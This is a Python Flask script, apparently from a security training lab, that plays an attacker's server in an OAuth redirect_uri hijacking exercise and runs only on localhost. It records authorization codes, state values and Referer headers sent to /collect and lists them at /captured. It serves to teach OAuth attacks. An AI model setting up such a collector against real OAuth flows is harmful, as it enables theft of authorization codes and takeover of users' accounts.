#!/usr/bin/env python3
"""
Lab 4.4 - server cua ATTACKER. Bat ky request nao toi /collect deu bi ghi lai
(dong vai server ma attacker dat vao redirect_uri). CHAY LOCAL.
"""
from flask import Flask, request, jsonify

app = Flask(__name__)
PORT = 8049

CAPTURED = []


@app.route("/collect")
def collect():
    item = {"code": request.args.get("code", ""),
            "state": request.args.get("state", ""),
            "referer": request.headers.get("Referer", "")}
    CAPTURED.append(item)
    return "thanks"


@app.route("/captured")
def captured():
    return jsonify(items=CAPTURED)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=PORT, debug=False, threaded=True)
